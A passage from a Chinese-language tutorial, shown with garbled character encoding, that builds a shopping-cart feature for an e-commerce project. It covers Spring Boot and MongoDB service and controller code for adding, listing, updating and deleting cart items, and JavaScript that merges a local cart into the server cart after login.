title;<span class="comment">// æ ‡é¢˜</span></span><br><span class="line">    <span class="keyword">private</span> String image;<span class="comment">// å›¾ç‰‡</span></span><br><span class="line">    <span class="keyword">private</span> Long price;<span class="comment">// åŠ å…¥è´­ç‰©è½¦æ—¶çš„ä»·æ ¼</span></span><br><span class="line">    <span class="keyword">private</span> Integer num;<span class="comment">// è´­ä¹°æ•°é‡</span></span><br><span class="line">    <span class="keyword">private</span> String spec;<span class="comment">// å•†å“è§„æ ¼å‚æ•°</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é›†åˆåç§°ä¸­çš„spELè¯­æ³•è¯´æ˜ï¼š</p>
<p><code>&quot;cart_user_#&#123;T(com.leyou.trade.utils.UserHolder).getUser()&#125;&quot;</code></p>
<ul>
<li><code>cart_user_</code>ï¼šæ™®é€šå­—ç¬¦ä¸²</li>
<li><code>#&#123;&#125;</code>ï¼šä»£è¡¨spELè¡¨è¾¾å¼</li>
<li><code>T(com.leyou.trade.utils.UserHolder).getUser()</code>ï¼šè°ƒç”¨<code>UserHolder</code>çš„é™æ€æ–¹æ³•<code>getUser()</code></li>
</ul>
<h3 id="æ·»åŠ å•†å“åˆ°è´­ç‰©è½¦"><a href="#æ·»åŠ å•†å“åˆ°è´­ç‰©è½¦" class="headerlink" title="æ·»åŠ å•†å“åˆ°è´­ç‰©è½¦"></a>æ·»åŠ å•†å“åˆ°è´­ç‰©è½¦</h3><h4 id="é¡µé¢å‘èµ·è¯·æ±‚ï¼š"><a href="#é¡µé¢å‘èµ·è¯·æ±‚ï¼š" class="headerlink" title="é¡µé¢å‘èµ·è¯·æ±‚ï¼š"></a>é¡µé¢å‘èµ·è¯·æ±‚ï¼š</h4><p>æˆ‘ä»¬å†æ¬¡å›åˆ°å•†å“è¯¦æƒ…é¡µï¼Œç™»å½•ä»¥åï¼Œç‚¹å‡»åŠ å…¥è´­ç‰©è½¦ï¼Œå‘ç°æ§åˆ¶å°å‘èµ·äº†è¯·æ±‚ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022708.png" alt="image-20200323204008804"></p>
<p>è¯·æ±‚åˆ†æï¼š</p>
<ul>
<li>è¯·æ±‚æ–¹å¼ï¼šPost</li>
<li>è¯·æ±‚è·¯å¾„ï¼š&#x2F;cart </li>
<li>è¯·æ±‚å‚æ•°ï¼šJsonå¯¹è±¡ï¼ŒåŒ…å«è´­ç‰©è½¦çš„æ‰€æœ‰å±æ€§ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨CartItemæ¥æ”¶</li>
<li>è¿”å›ç»“æœï¼šæ— </li>
</ul>
<h4 id="åå°æ·»åŠ è´­ç‰©è½¦"><a href="#åå°æ·»åŠ è´­ç‰©è½¦" class="headerlink" title="åå°æ·»åŠ è´­ç‰©è½¦"></a>åå°æ·»åŠ è´­ç‰©è½¦</h4><p>é¦–å…ˆæ–°å»ºä¸€ä¸ªæ“ä½œMongoDBçš„Repositoryï¼Œåœ¨<code>ly-trade</code>çš„<code>com.leyou.trade.repository</code>åŒ…ä¸‹ï¼Œæ·»åŠ ä¸€ä¸ªæ¥å£ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.repository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.entity.CartItem;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.mongodb.repository.MongoRepository;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CartRepository</span> <span class="keyword">extends</span> <span class="title class_">MongoRepository</span>&lt;CartItem, Long&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>ç„¶ååœ¨<code>ly-trade</code>çš„<code>com.leyou.trade.service</code>åŒ…ä¸­æ·»åŠ <code>CartService</code>æ¥å£ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.entity.CartItem;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CartService</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ–°å¢è´­ç‰©è½¦</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> cartItem è´­ç‰©è½¦å•†å“</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">saveCartItem</span><span class="params">(CartItem cartItem)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨<code>ly-trade</code>çš„<code>com.leyou.trade.service.impl</code>åŒ…ä¸­æ·»åŠ <code>CartServiceImpl</code>å®ç°ç±»ï¼š</p>
<p>è¿™é‡Œæˆ‘ä»¬ä¸è®¿é—®æ•°æ®åº“ï¼Œè€Œæ˜¯ç›´æ¥æ“ä½œMongoDBã€‚åŸºæœ¬æ€è·¯ï¼š</p>
<ul>
<li>å…ˆæŸ¥è¯¢ä¹‹å‰çš„è´­ç‰©è½¦æ•°æ®</li>
<li>åˆ¤æ–­è¦æ·»åŠ çš„å•†å“æ˜¯å¦å­˜åœ¨<ul>
<li>å­˜åœ¨ï¼šåˆ™ç›´æ¥ä¿®æ”¹æ•°é‡ï¼Œå†™å…¥MongoDB</li>
<li>ä¸å­˜åœ¨ï¼šç›´æ¥å†™å…¥MongoDB</li>
</ul>
</li>
</ul>
<p>ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.entity.CartItem;</span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.repository.CartRepository;</span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.service.CartService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Optional;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CartServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">CartService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> CartRepository repository;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CartServiceImpl</span><span class="params">(CartRepository repository)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.repository = repository;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveCartItem</span><span class="params">(CartItem cartItem)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.å…ˆè·å–ä¹‹å‰çš„è´­ç‰©è½¦æ•°æ®</span></span><br><span class="line">        Optional&lt;CartItem&gt; optional = repository.findById(cartItem.getSkuId());</span><br><span class="line">        <span class="comment">// 2.åˆ¤æ–­æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">        <span class="keyword">if</span>(optional.isPresent())&#123;</span><br><span class="line">            <span class="comment">// 2.1.å­˜åœ¨ï¼Œè®°å½•æ–°çš„å•†å“æ•°é‡</span></span><br><span class="line">            <span class="type">Integer</span> <span class="variable">num</span> <span class="operator">=</span> cartItem.getNum();</span><br><span class="line">            <span class="comment">// 2.2.è·å–æ—§çš„æ•°æ®</span></span><br><span class="line">            cartItem = optional.get();</span><br><span class="line">            <span class="comment">// 2.3.æ•°é‡ç´¯åŠ </span></span><br><span class="line">            cartItem.setNum(num + cartItem.getNum());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3.å†™å…¥db</span></span><br><span class="line">        repository.save(cartItem);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>æˆ‘ä»¬åœ¨<code>ly-trade</code>çš„<code>com.leyou.trade.web</code>åŒ…ä¸­æ·»åŠ æ–°çš„controllerï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.entity.CartItem;</span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.service.CartService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;cart&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CartController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> CartService cartService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CartController</span><span class="params">(CartService cartService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.cartService = cartService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ–°å¢è´­ç‰©è½¦</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> cartItem è´­ç‰©è½¦æ•°æ®</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> æ— </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title function_">saveCartItem</span><span class="params">(<span class="meta">@RequestBody</span> CartItem cartItem)</span>&#123;</span><br><span class="line">        cartService.saveCartItem(cartItem);</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.status(HttpStatus.CREATED).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h4><p>ç™»å½•åï¼Œåœ¨å•†å“é¡µé¢å†æ¬¡ç‚¹å‡»æ·»åŠ è´­ç‰©è½¦ï¼Œç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022709.png" alt="image-20200323220810325"></p>
<h3 id="æŸ¥è¯¢è´­ç‰©è½¦"><a href="#æŸ¥è¯¢è´­ç‰©è½¦" class="headerlink" title="æŸ¥è¯¢è´­ç‰©è½¦"></a>æŸ¥è¯¢è´­ç‰©è½¦</h3><h4 id="é¡µé¢å‘èµ·è¯·æ±‚"><a href="#é¡µé¢å‘èµ·è¯·æ±‚" class="headerlink" title="é¡µé¢å‘èµ·è¯·æ±‚"></a>é¡µé¢å‘èµ·è¯·æ±‚</h4><p>æˆ‘ä»¬è¿›å…¥è´­ç‰©è½¦åˆ—è¡¨é¡µé¢ï¼Œç„¶ååˆ·æ–°é¡µé¢ï¼ŒæŸ¥çœ‹æ§åˆ¶å°çš„è¯·æ±‚ï¼š</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022710.png" alt="image-20200323220905668"></p>
<h4 id="åå°å®ç°"><a href="#åå°å®ç°" class="headerlink" title="åå°å®ç°"></a>åå°å®ç°</h4><p>è¯·æ±‚åˆ†æï¼š</p>
<ul>
<li>è¯·æ±‚æ–¹å¼ï¼šGet</li>
<li>è¯·æ±‚è·¯å¾„ï¼š&#x2F;cart&#x2F;list</li>
<li>è¯·æ±‚å‚æ•°ï¼šæ— </li>
<li>è¿”å›ç»“æœï¼šå½“å‰ç”¨æˆ·çš„è´­ç‰©è½¦é›†åˆ</li>
</ul>
<p>ç„¶ååœ¨<code>ly-trade</code>çš„<code>com.leyou.trade.service</code>åŒ…ä¸­<code>CartService</code>æ¥å£æ·»åŠ æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æŸ¥è¯¢ç”¨æˆ·çš„è´­ç‰©è½¦å•†å“é›†åˆ</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> è´­ç‰©è½¦å•†å“é›†åˆ</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">List&lt;CartItem&gt; <span class="title function_">queryCartList</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨<code>ly-trade</code>çš„<code>com.leyou.trade.service.impl</code>åŒ…ä¸­<code>CartServiceImpl</code>å®ç°ç±»ä¸­æ·»åŠ æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> List&lt;CartItem&gt; <span class="title function_">queryCartList</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> repository.findAll();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>æˆ‘ä»¬åœ¨<code>ly-trade</code>çš„<code>com.leyou.trade.web</code>åŒ…ä¸­çš„<code>CartController</code>ä¸­æ·»åŠ æ–°çš„æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æŸ¥è¯¢è´­ç‰©è½¦åˆ—è¡¨</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> è´­ç‰©è½¦å•†å“åˆ—è¡¨</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;list&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;List&lt;CartItem&gt;&gt; <span class="title function_">queryCartList</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.ok(cartService.queryCartList());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="ä¿®æ”¹å•†å“æ•°é‡"><a href="#ä¿®æ”¹å•†å“æ•°é‡" class="headerlink" title="ä¿®æ”¹å•†å“æ•°é‡"></a>ä¿®æ”¹å•†å“æ•°é‡</h3><h4 id="é¡µé¢å‘èµ·è¯·æ±‚-1"><a href="#é¡µé¢å‘èµ·è¯·æ±‚-1" class="headerlink" title="é¡µé¢å‘èµ·è¯·æ±‚"></a>é¡µé¢å‘èµ·è¯·æ±‚</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022711.png" alt="image-20200323223106917"> </p>
<p>é¡µé¢è¯·æ±‚åˆ†æï¼š</p>
<ul>
<li>è¯·æ±‚æ–¹å¼ï¼šPUT</li>
<li>è¯·æ±‚è·¯å¾„ï¼š&#x2F;cart</li>
<li>è¯·æ±‚å‚æ•°ï¼š<ul>
<li>id: å•†å“skuId</li>
<li>num: æœ€ç»ˆçš„æ•°é‡</li>
</ul>
</li>
<li>è¿”å›ç»“æœï¼šæ— </li>
</ul>
<h4 id="åå°å®ç°-1"><a href="#åå°å®ç°-1" class="headerlink" title="åå°å®ç°"></a>åå°å®ç°</h4><p>ç„¶ååœ¨<code>ly-trade</code>çš„<code>com.leyou.trade.service</code>åŒ…ä¸­<code>CartService</code>æ¥å£æ·»åŠ æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ›´æ–°è´­ç‰©è½¦æŒ‡å®šå•†å“çš„æ•°é‡</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> skuId å•†å“id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> num æ•°é‡</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">updateNum</span><span class="params">(Long skuId, Integer num)</span>;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨<code>ly-trade</code>çš„<code>com.leyou.trade.service.impl</code>åŒ…ä¸­<code>CartServiceImpl</code>å®ç°ç±»ä¸­æ·»åŠ æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateNum</span><span class="params">(Long skuId, Integer num)</span> &#123;</span><br><span class="line">    <span class="comment">// æŸ¥è¯¢ä»¥å‰çš„è´­ç‰©è½¦æ•°æ®</span></span><br><span class="line">    Optional&lt;CartItem&gt; optional = repository.findById(skuId);</span><br><span class="line">    <span class="comment">// åˆ¤æ–­æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">    <span class="keyword">if</span>(!optional.isPresent())&#123;</span><br><span class="line">        <span class="comment">// ä¸å­˜åœ¨ç›´æ¥ç»“æŸ</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;å•†å“ä¸å­˜åœ¨ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å­˜åœ¨åˆ™ä¿®æ”¹</span></span><br><span class="line">    <span class="type">CartItem</span> <span class="variable">cartItem</span> <span class="operator">=</span> optional.get();</span><br><span class="line">    cartItem.setNum(num);</span><br><span class="line">    repository.save(cartItem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>æˆ‘ä»¬åœ¨<code>ly-trade</code>çš„<code>com.leyou.trade.web</code>åŒ…ä¸­çš„<code>CartController</code>ä¸­æ·»åŠ æ–°çš„æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ›´æ–°è´­ç‰©è½¦æŒ‡å®šå•†å“çš„æ•°é‡</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> skuId å•†å“id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> num æ•°é‡</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> æ— </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@PutMapping</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title function_">updateNum</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="meta">@RequestParam(&quot;id&quot;)</span> Long skuId, <span class="meta">@RequestParam(&quot;num&quot;)</span> Integer num)</span> &#123;</span><br><span class="line">    cartService.updateNum(skuId, num);</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.noContent().build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="åˆ é™¤è´­ç‰©è½¦å•†å“"><a href="#åˆ é™¤è´­ç‰©è½¦å•†å“" class="headerlink" title="åˆ é™¤è´­ç‰©è½¦å•†å“"></a>åˆ é™¤è´­ç‰©è½¦å•†å“</h3><h4 id="é¡µé¢å‘èµ·è¯·æ±‚-2"><a href="#é¡µé¢å‘èµ·è¯·æ±‚-2" class="headerlink" title="é¡µé¢å‘èµ·è¯·æ±‚"></a>é¡µé¢å‘èµ·è¯·æ±‚</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022712.png" alt="image-20200323223334102"> </p>
<p>é¡µé¢è¯·æ±‚åˆ†æï¼š</p>
<ul>
<li>è¯·æ±‚æ–¹å¼ï¼šDELETE</li>
<li>è¯·æ±‚è·¯å¾„ï¼š&#x2F;cart&#x2F;{id}</li>
<li>è¯·æ±‚å‚æ•°ï¼šå•†å“skuId</li>
<li>è¿”å›ç»“æœï¼šæ— </li>
</ul>
<h4 id="åå°å®ç°-2"><a href="#åå°å®ç°-2" class="headerlink" title="åå°å®ç°"></a>åå°å®ç°</h4><p>ç„¶ååœ¨<code>ly-trade</code>çš„<code>com.leyou.trade.service</code>åŒ…ä¸­<code>CartService</code>æ¥å£æ·»åŠ æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆ é™¤è´­ç‰©è½¦æŒ‡å®šå•†å“</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> skuId å•†å“id</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">deleteCart</span><span class="params">(Long skuId)</span>;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨<code>ly-trade</code>çš„<code>com.leyou.trade.service.impl</code>åŒ…ä¸­<code>CartServiceImpl</code>å®ç°ç±»ä¸­æ·»åŠ æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteCart</span><span class="params">(Long skuId)</span> &#123;</span><br><span class="line">    repository.deleteById(skuId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>æˆ‘ä»¬åœ¨<code>ly-trade</code>çš„<code>com.leyou.trade.web</code>åŒ…ä¸­çš„<code>CartController</code>ä¸­æ·»åŠ æ–°çš„æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åˆ é™¤æŒ‡å®šçš„è´­ç‰©è½¦å•†å“</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> skuId å•†å“id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> æ— </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@DeleteMapping(&quot;&#123;skuId&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title function_">deleteCart</span><span class="params">(<span class="meta">@PathVariable(&quot;skuId&quot;)</span> Long skuId)</span> &#123;</span><br><span class="line">    cartService.deleteCart(skuId);</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.noContent().build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="ç™»å½•åè´­ç‰©è½¦åˆå¹¶"><a href="#ç™»å½•åè´­ç‰©è½¦åˆå¹¶" class="headerlink" title="ç™»å½•åè´­ç‰©è½¦åˆå¹¶"></a>ç™»å½•åè´­ç‰©è½¦åˆå¹¶</h3><p>ç”¨æˆ·ç™»å½•åï¼Œå¦‚æœæœªç™»å½•ä¸‹æ·»åŠ æœ‰è´­ç‰©è½¦ï¼Œåˆ™éœ€è¦æŠŠæœªç™»å½•çš„è´­ç‰©è½¦æ•°æ®æ·»åŠ åˆ°å·²ç™»å½•è´­ç‰©è½¦åˆ—è¡¨ä¸­ã€‚</p>
<h4 id="æ€è·¯åˆ†æ-1"><a href="#æ€è·¯åˆ†æ-1" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h4><p>åŸºæœ¬æµç¨‹å¦‚ä¸‹ï¼š</p>
<ul>
<li><p>å½“è·³è½¬åˆ°è´­ç‰©è½¦é¡µé¢ï¼ŒæŸ¥è¯¢è´­ç‰©è½¦åˆ—è¡¨å‰ï¼Œéœ€è¦åˆ¤æ–­ç”¨æˆ·ç™»å½•çŠ¶æ€</p>
</li>
<li><p>å¦‚æœç™»å½•ï¼š</p>
<ul>
<li>é¦–å…ˆæ£€æŸ¥ç”¨æˆ·çš„LocalStorageä¸­æ˜¯å¦æœ‰è´­ç‰©è½¦ä¿¡æ¯ï¼Œ</li>
<li>å¦‚æœæœ‰ï¼Œåˆ™æäº¤åˆ°åå°ä¿å­˜ï¼Œ</li>
<li>æ¸…ç©ºLocalStorage</li>
</ul>
</li>
<li><p>å¦‚æœæœªç™»å½•ï¼Œç›´æ¥æŸ¥è¯¢å³å¯</p>
</li>
</ul>
<h4 id="å‰ç«¯é¡µé¢"><a href="#å‰ç«¯é¡µé¢" class="headerlink" title="å‰ç«¯é¡µé¢"></a>å‰ç«¯é¡µé¢</h4><p>å…ˆçœ‹ä¸€ä¸‹ç°åœ¨çš„åŠ è½½è´­ç‰©è½¦çš„é€»è¾‘ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022713.png" alt="1554976355461"></p>
<p>æˆ‘ä»¬éœ€è¦åœ¨åŠ è½½å·²ç™»å½•è´­ç‰©è½¦æ•°æ®ä¹‹å‰ï¼Œæ–°å¢ä¸€æ®µåˆ¤æ–­é€»è¾‘ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022714.png" alt="1554976478290"></p>
<p>éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åˆ¤æ–­æœ¬åœ°æœªç™»å½•è´­ç‰©è½¦æ˜¯å¦å­˜åœ¨ï¼Œ</span></span><br><span class="line"><span class="keyword">const</span> carts = ly.<span class="property">store</span>.<span class="title function_">get</span>(<span class="string">&quot;carts&quot;</span>) || [];</span><br><span class="line"><span class="keyword">if</span> (carts.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœå­˜åœ¨ï¼Œå‘åˆ°åå°ï¼Œæ·»åŠ åˆ°redisï¼Œåˆ é™¤æœ¬åœ°è´­ç‰©è½¦</span></span><br><span class="line">    ly.<span class="property">http</span>.<span class="title function_">post</span>(<span class="string">&quot;/trade/cart/list&quot;</span>, carts).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// æŸ¥è¯¢è´­ç‰©è½¦</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">handleLoginCarts</span>();</span><br><span class="line">        <span class="comment">// åˆ é™¤æœ¬åœ°è´­ç‰©è½¦</span></span><br><span class="line">        ly.<span class="property">store</span>.<span class="title function_">del</span>(<span class="string">&quot;carts&quot;</span>);</span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// æŸ¥è¯¢è´­ç‰©è½¦</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">handleLoginCarts</span>();</span><br><span class="line">    &#125;)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// æŸ¥è¯¢è´­ç‰©è½¦</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">handleLoginCarts</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="æ‰¹é‡æ–°å¢è´­ç‰©è½¦"><a href="#æ‰¹é‡æ–°å¢è´­ç‰©è½¦" class="headerlink" title="æ‰¹é‡æ–°å¢è´­ç‰©è½¦"></a>æ‰¹é‡æ–°å¢è´­ç‰©è½¦</h4><p>åˆ·æ–°é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°è¯·æ±‚å·²ç»å‘å‡ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022715.png" alt="image-20200323224233503"></p>
<h5 id="controller-1"><a href="#controller-1" class="headerlink" title="controller"></a>controller</h5><p>åˆ†æä¸€ä¸‹è¯·æ±‚ï¼š</p>
<ul>
<li>è¯·æ±‚æ–¹å¼ï¼šPOST</li>
<li>è¯·æ±‚è·¯å¾„ï¼š&#x2F;cart&#x2F;list</li>
<li>è¯·æ±‚å‚æ•°ï¼šjsonæ•°ç»„ï¼Œé‡Œé¢æ˜¯cartå¯¹è±¡</li>
<li>è¿”å›ç»“æœï¼Œåº”è¯¥æ˜¯void</li>
</ul>
<p>æˆ‘ä»¬åœ¨<code>ly-trade</code>çš„<code>com.leyou.trade.web</code>åŒ…ä¸­çš„<code>CartController</code>ä¸­æ·»åŠ æ–°çš„æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**   </span></span><br><span class="line"><span class="comment">     * æ‰¹é‡æ·»åŠ è´­ç‰©è½¦</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> æ— </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;list&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title function_">addCartItemList</span><span class="params">(<span class="meta">@RequestBody</span> List&lt;CartItem&gt; itemList)</span> &#123;</span><br><span class="line">    cartService.addCartItemList(itemList);</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.status(HttpStatus.CREATED).build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



